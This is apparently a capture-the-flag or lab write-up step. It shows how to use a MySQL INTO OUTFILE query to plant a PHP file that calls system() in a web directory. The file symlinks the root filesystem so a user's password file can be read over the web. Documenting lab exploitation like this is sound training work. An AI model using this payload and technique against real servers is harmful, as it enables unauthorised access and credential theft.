# EXPLOIT 5: INFILTRATING ROOT

Returning to the point where we gained root access to the database, there's another method we can use to exploit it. Since the webserver runs under *Apache*, we can leverage this to perform a privilege escalation.

## Apache suEXEC

First, it's important to know that Apache includes a feature called suEXEC, which allows users to run CGI and SSI programs under different user IDs than the one used by the web server. Typically, when a CGI or SSI program is executed, it runs with the same user permissions as the web server.

We can take advantage of this feature by developing and executing a custom CGI script. To do this, we can create a PHP script similar to the one in [writeup1](../writeup1.md) and place it in */var/www/forum/templates_c/suexec.php*. 

```
SELECT "<?php system('ln -sf / root_filesystem'); symlink('/', 'root_filesystem'); ?>" into outfile "/var/www/forum/templates_c/suexec.php"
```

The script will create a symbolic link to **"/"** with the name *root_filesystem*, allowing us to access the root filesystem. Next, we need to navigate to the page where the file is located in order to run the script.

```
https://192.168.144.3/forum/templates_c/suexec.php
```

Finally, we can access the symbolic link and navigate through the directories to locate the password for *lmezard* in `/home/LOOKATME/password`.

```
https://192.168.144.3/forum/templates_c/root_filesystem/
```

From there, we can proceed to the section where we begin exploiting *lmezard*.
